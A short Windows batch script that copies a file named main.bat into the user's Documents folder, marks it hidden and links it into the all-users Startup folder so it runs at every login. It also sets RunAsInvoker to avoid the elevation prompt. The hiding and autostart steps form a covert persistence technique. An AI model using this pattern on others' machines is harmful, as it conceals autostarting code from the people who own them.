@echo off

Set _COMPAT_LAYER=RunAsInvoker

:: Your batch file commands that require admin rights go here
xcopy /y "%~dp0\main.bat" "%USERPROFILE%\Documents"
set "fileToHide=%USERPROFILE%\Documents\main.bat"

attrib +h "%fileToHide%"

set "targetFile=%USERPROFILE%\Documents\main.bat"
set "shortcutFile=C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\mainbat.lnk"

mklink "%shortcutFile%" "%targetFile%"

pause